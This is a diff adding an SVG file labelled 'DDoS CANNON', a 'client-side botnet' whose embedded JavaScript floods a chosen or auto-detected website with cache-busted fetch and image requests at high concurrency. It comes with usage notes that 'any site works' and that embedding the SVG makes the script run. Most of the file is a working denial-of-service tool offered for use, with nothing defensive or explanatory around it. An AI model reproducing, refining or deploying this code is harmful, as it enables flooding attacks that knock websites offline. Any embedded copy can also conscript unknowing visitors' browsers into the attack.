@@ -1,0 +1,290 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 620" width="700" height="620" font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace">
+<defs>
+<radialGradient id="bg" cx="50%" cy="42%" r="85%">
+<stop offset="0%" stop-color="#0a1626"/><stop offset="55%" stop-color="#05090f"/><stop offset="100%" stop-color="#020306"/>
+</radialGradient>
+<radialGradient id="coreG" cx="50%" cy="50%" r="50%">
+<stop offset="0%" stop-color="#ffffff"/><stop offset="45%" stop-color="#a5f3fc"/><stop offset="100%" stop-color="#0e7490"/>
+</radialGradient>
+<radialGradient id="haloG" cx="50%" cy="50%" r="50%">
+<stop offset="0%" stop-color="#22d3ee" stop-opacity="0.5"/><stop offset="100%" stop-color="#22d3ee" stop-opacity="0"/>
+</radialGradient>
+<filter id="glow" x="-120%" y="-120%" width="340%" height="340%">
+<feGaussianBlur stdDeviation="3.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+</filter>
+<filter id="soft" x="-150%" y="-150%" width="400%" height="400%">
+<feGaussianBlur stdDeviation="14"/>
+</filter>
+<pattern id="grid" width="26" height="26" patternUnits="userSpaceOnUse">
+<path d="M26 0H0V26" fill="none" stroke="#0d2438" stroke-width="1"/>
+</pattern>
+</defs>
+
+<style>/*<![CDATA[*/
+.title{font-size:21px;font-weight:700;letter-spacing:3px}
+.sub{font-size:10px;letter-spacing:0.5px}
+.pill{font-size:11px;font-weight:700;letter-spacing:1.6px}
+.card{fill:#08131f;stroke:#14304a}
+.clab{font-size:8.5px;letter-spacing:1.3px;fill:#587f9f}
+.cval{font-size:19px;font-weight:700;fill:#d8f2ff}
+.bot{fill:#22d3ee;opacity:0.18}
+.link{stroke:#22d3ee;stroke-width:1;opacity:0.06}
+.pkt{fill:#c6f6ff;opacity:0}
+.rip{fill:none;stroke:#22d3ee;stroke-width:1.4;opacity:0}
+.note{font-size:9.5px;fill:#4d7191;letter-spacing:0.4px}
+.panel{width:100%;height:100%;box-sizing:border-box;padding:9px 11px;border-radius:11px;background:linear-gradient(180deg,rgba(14,28,44,0.95),rgba(6,12,20,0.95));border:1px solid #16324a;color:#bfe0f5;font-family:inherit}
+.row{display:flex;align-items:center;gap:7px;margin-bottom:8px}
+.row:last-child{margin-bottom:0}
+.lab{font-size:9px;letter-spacing:1.3px;color:#587f9f;white-space:nowrap}
+.in{flex:1;min-width:0;background:#050b13;border:1px solid #1b3c58;border-radius:7px;color:#d8f2ff;padding:7px 9px;font:inherit;font-size:12px;outline:none}
+.in:focus{border-color:#22d3ee}
+.in.sm{flex:0 0 58px;text-align:center}
+.btn{border:0;border-radius:7px;padding:7px 12px;font:inherit;font-size:11px;font-weight:700;letter-spacing:1.2px;cursor:pointer;color:#04121a;white-space:nowrap}
+.go{background:#34d399}
+.go.live{background:#fbbf24}
+.stop{background:#f87171}
+.rst{background:#334e68;color:#cfe9ff}
+.rng{width:80px;accent-color:#22d3ee;cursor:pointer}
+.val{font-size:11px;color:#22d3ee;width:24px;text-align:right}
+/*]]>*/</style>
+
+<rect width="700" height="620" fill="url(#bg)"/>
+<rect width="700" height="620" fill="url(#grid)" opacity="0.45"/>
+
+<text class="title" x="16" y="31" fill="#e8f7ff">DDoS CANNON</text>
+<text class="sub" x="16" y="48" fill="#537b9c">client-side botnet · your browser is the bot</text>
+
+<g transform="translate(556,16)">
+<rect width="130" height="28" rx="14" fill="#0a1b28" stroke="#16324a"/>
+<circle id="dot" cx="17" cy="14" r="5" fill="#5b7a94"/>
+<text id="stxt" class="pill" x="30" y="19" fill="#94a3b8">IDLE</text>
+</g>
+
+<foreignObject x="14" y="62" width="672" height="98">
+<div xmlns="http://www.w3.org/1999/xhtml" class="panel">
+<div class="row">
+<span class="lab">TARGET</span>
+<input id="target" class="in" type="text" spellcheck="false" placeholder="https://example.com"/>
+<button id="go" class="btn go">START</button>
+<button id="stop" class="btn stop">STOP</button>
+<button id="rst" class="btn rst">RESET</button>
+</div>
+<div class="row">
+<span class="lab">IN-FLIGHT</span><input id="conc" class="rng" type="range" min="4" max="256" step="4" value="48"/><span id="concv" class="val">48</span>
+<span class="lab">BOTS</span><input id="bots" class="rng" type="range" min="8" max="96" step="4" value="40"/><span id="botsv" class="val">40</span>
+<span class="lab">RUN FOR (s)</span><input id="dur" class="in sm" type="number" min="0" value="0"/>
+</div>
+</div>
+</foreignObject>
+
+<circle cx="350" cy="336" r="72" fill="url(#haloG)" filter="url(#soft)"/>
+<g id="links"></g>
+<g id="nodes"></g>
+<g id="pkts"></g>
+<g id="rips"></g>
+<circle id="coreR" cx="350" cy="336" r="20" fill="url(#coreG)" filter="url(#glow)"/>
+<circle cx="350" cy="336" r="28" fill="none" stroke="#22d3ee" stroke-width="1" opacity="0.45"/>
+
+<g>
+<rect class="card" x="14" y="498" width="104" height="56" rx="9"/>
+<text class="clab" x="66" y="518" text-anchor="middle">REQUESTS</text>
+<text id="s_req" class="cval" x="66" y="542" text-anchor="middle">0</text>
+</g>
+<g>
+<rect class="card" x="126" y="498" width="104" height="56" rx="9"/>
+<text class="clab" x="178" y="518" text-anchor="middle">REQ/SEC</text>
+<text id="s_rps" class="cval" x="178" y="542" text-anchor="middle">0</text>
+</g>
+<g>
+<rect class="card" x="238" y="498" width="104" height="56" rx="9"/>
+<text class="clab" x="290" y="518" text-anchor="middle">PEAK/SEC</text>
+<text id="s_peak" class="cval" x="290" y="542" text-anchor="middle">0</text>
+</g>
+<g>
+<rect class="card" x="350" y="498" width="104" height="56" rx="9"/>
+<text class="clab" x="402" y="518" text-anchor="middle">IN-FLIGHT</text>
+<text id="s_inf" class="cval" x="402" y="542" text-anchor="middle">0</text>
+</g>
+<g>
+<rect class="card" x="462" y="498" width="104" height="56" rx="9"/>
+<text class="clab" x="514" y="518" text-anchor="middle">ERRORS</text>
+<text id="s_err" class="cval" x="514" y="542" text-anchor="middle">0</text>
+</g>
+<g>
+<rect class="card" x="574" y="498" width="104" height="56" rx="9"/>
+<text class="clab" x="626" y="518" text-anchor="middle">UPTIME</text>
+<text id="s_up" class="cval" x="626" y="542" text-anchor="middle">0.0s</text>
+</g>
+
+<text id="log" class="note" x="14" y="578">ready · cross-origin fires use no-cors, so any site works</text>
+<text class="note" x="14" y="594" opacity="0.7">host this .svg on your site and it auto-targets it · embed with iframe or object so the script runs</text>
+
+<script type="text/javascript">//<![CDATA[
+(function(){
+var NS='http://www.w3.org/2000/svg';
+function $(i){return document.getElementById(i);}
+function mk(t,a){var e=document.createElementNS(NS,t);for(var k in a)e.setAttribute(k,a[k]);return e;}
+var links=$('links'),nodes=$('nodes'),pkts=$('pkts'),rips=$('rips'),coreR=$('coreR');
+var CX=350,CY=336;
+var bots=[],packets=[],ripples=[],pi=0,ri=0,ripAcc=0;
+var running=false,total=0,errors=0,inflight=0,peak=0,rps=0,t0=0,shown=0,shownT=0,durTimer=null;
+var MAXIN=48,BOTN=40;
+
+function fmt(n){return n.toLocaleString('en-US');}
+
+function detect(){
+  var t='';
+  try{if(/^https?:/.test(location.protocol)&&location.hostname)t=location.origin;}catch(e){}
+  if(!t){try{if(document.referrer)t=new URL(document.referrer).origin;}catch(e){}}
+  return t;
+}
+function getTarget(){
+  var v=$('target').value.trim();
+  if(!v)return '';
+  if(!/^https?:\/\//i.test(v))v='https://'+v;
+  return v;
+}
+function bust(u){
+  var h='',i=u.indexOf('#');
+  if(i>-1){h=u.slice(i);u=u.slice(0,i);}
+  return u+(u.indexOf('?')>-1?'&':'?')+'ddos='+Math.random().toString(36).slice(2,10)+Date.now().toString(36)+h;
+}
+
+function build(n){
+  while(links.firstChild)links.removeChild(links.firstChild);
+  while(nodes.firstChild)nodes.removeChild(nodes.firstChild);
+  bots=[];
+  var o=Math.max(6,Math.round(n*0.62)),inn=Math.max(0,n-o);
+  ring(o,134,5,0);
+  ring(inn,80,3.6,Math.PI/Math.max(1,o));
+}
+function ring(c,R,r,off){
+  for(var i=0;i<c;i++){
+    var a=off+(i/c)*Math.PI*2,x=CX+Math.cos(a)*R,y=CY+Math.sin(a)*R;
+    var l=mk('line',{x1:CX,y1:CY,x2:x,y2:y,'class':'link'});
+    links.appendChild(l);
+    var d=mk('circle',{cx:x,cy:y,r:r,'class':'bot'});
+    nodes.appendChild(d);
+    bots.push({x:x,y:y,r0:r,el:d,ln:l,heat:0});
+  }
+}
+
+for(var i=0;i<180;i++){var c=mk('circle',{r:2,'class':'pkt'});c.style.opacity=0;pkts.appendChild(c);packets.push({el:c,life:0,x0:CX,y0:CY});}
+for(var j=0;j<10;j++){var q=mk('circle',{cx:CX,cy:CY,r:30,'class':'rip'});q.style.opacity=0;rips.appendChild(q);ripples.push({el:q,life:0});}
+
+function hit(k){
+  if(!bots.length)return;
+  var b=bots[k%bots.length];
+  b.heat=Math.min(1,b.heat+0.55);
+  var p=packets[pi++%packets.length];
+  p.x0=b.x;p.y0=b.y;p.life=1;
+  p.el.setAttribute('cx',b.x);p.el.setAttribute('cy',b.y);
+}
+
+var last=0;
+function frame(ts){
+  var dt=Math.min(60,ts-last||16);last=ts;
+  for(var i=0;i<bots.length;i++){var b=bots[i];
+    if(b.heat>0.003){
+      b.heat*=Math.pow(0.87,dt/16);
+      b.el.style.opacity=(0.18+b.heat*0.82).toFixed(3);
+      b.el.setAttribute('r',(b.r0*(1+b.heat*0.8)).toFixed(2));
+      b.ln.style.opacity=(0.05+b.heat*0.5).toFixed(3);
+    }
+  }
+  for(var k=0;k<packets.length;k++){var p=packets[k];
+    if(p.life>0){
+      p.life-=dt/330;
+      if(p.life<=0){p.life=0;p.el.style.opacity=0;}
+      else{var t=1-p.life;
+        p.el.setAttribute('cx',(p.x0+(CX-p.x0)*t).toFixed(1));
+        p.el.setAttribute('cy',(p.y0+(CY-p.y0)*t).toFixed(1));
+        p.el.style.opacity=(0.85*p.life).toFixed(3);}
+    }
+  }
+  ripAcc+=dt;
+  if(running&&ripAcc>75){ripAcc=0;var rr=ripples[ri++%ripples.length];rr.life=1;}
+  for(var m=0;m<ripples.length;m++){var rp=ripples[m];
+    if(rp.life>0){rp.life-=dt/760;
+      if(rp.life<=0){rp.life=0;rp.el.style.opacity=0;}
+      else{rp.el.setAttribute('r',(30+(1-rp.life)*108).toFixed(1));rp.el.style.opacity=(rp.life*0.45).toFixed(3);}}
+  }
+  var hot=Math.min(1,rps/900);
+  coreR.setAttribute('r',(20+hot*9).toFixed(1));
+  requestAnimationFrame(frame);
+}
+requestAnimationFrame(frame);
+
+function pump(){
+  if(!running)return;
+  if(inflight>=MAXIN)return;
+  var base=getTarget();if(!base)return;
+  inflight++;total++;
+  var url=bust(base);
+  hit((Math.random()*100000)|0);
+  var done=function(){if(inflight>0)inflight--;};
+  if(Math.random()<0.5){
+    try{fetch(url,{mode:'no-cors',cache:'no-store',credentials:'omit'}).then(done,function(){errors++;done();});}
+    catch(e){errors++;done();}
+  }else{
+    var im=new Image();im.onload=done;im.onerror=function(){errors++;done();};im.src=url;
+  }
+}
+setInterval(function(){for(var i=0;i<40;i++)pump();},0);
+
+setInterval(function(){
+  var now=performance.now();
+  if(running){
+    var dt=(now-shownT)/1000;
+    if(dt>=0.25){
+      var inst=(total-shown)/dt;
+      rps=Math.round(rps*0.35+inst*0.65);
+      if(rps>peak)peak=rps;
+      shown=total;shownT=now;
+    }
+  }else{rps=Math.round(rps*0.7);if(rps<1)rps=0;}
+  $('s_req').textContent=fmt(total);
+  $('s_rps').textContent=fmt(rps);
+  $('s_peak').textContent=fmt(peak);
+  $('s_inf').textContent=inflight;
+  $('s_err').textContent=fmt(errors);
+  $('s_up').textContent=(t0?((now-t0)/1000).toFixed(1):'0.0')+'s';
+},200);
+
+function start(){
+  if(running)return;
+  if(!getTarget()){$('target').focus();$('log').textContent='enter a target URL first';return;}
+  running=true;t0=performance.now();shownT=t0;shown=total;
+  $('stxt').textContent='FIRING';$('stxt').setAttribute('fill','#34d399');$('dot').setAttribute('fill','#34d399');
+  $('go').classList.add('live');
+  $('log').textContent='flooding '+getTarget()+' with '+MAXIN+' concurrent sockets';
+  var d=parseInt($('dur').value||'0',10)||0;
+  if(durTimer)clearTimeout(durTimer);
+  if(d>0)durTimer=setTimeout(stop,d*1000);
+}
+function stop(){
+  running=false;
+  $('stxt').textContent='IDLE';$('stxt').setAttribute('fill','#94a3b8');$('dot').setAttribute('fill','#5b7a94');
+  $('go').classList.remove('live');
+  if(durTimer)clearTimeout(durTimer);
+  $('log').textContent='stopped · '+fmt(total)+' requests dispatched · '+fmt(errors)+' failed';
+}
+function reset(){
+  stop();total=0;errors=0;peak=0;rps=0;shown=0;t0=0;
+  $('log').textContent='reset';
+}
+
+$('go').addEventListener('click',start);
+$('stop').addEventListener('click',stop);
+$('rst').addEventListener('click',reset);
+$('conc').addEventListener('input',function(){MAXIN=+this.value;$('concv').textContent=this.value;});
+$('bots').addEventListener('input',function(){BOTN=+this.value;$('botsv').textContent=this.value;build(BOTN);});
+$('target').addEventListener('keydown',function(e){if(e.key==='Enter'){if(running)stop();else start();}});
+
+var d=detect();
+if(d)$('target').value=d;
+build(BOTN);
+$('log').textContent=d?('detected host: '+d+' · press START'):'no host detected · type a URL and press START';
+})();
+//]]></script>
+</svg>
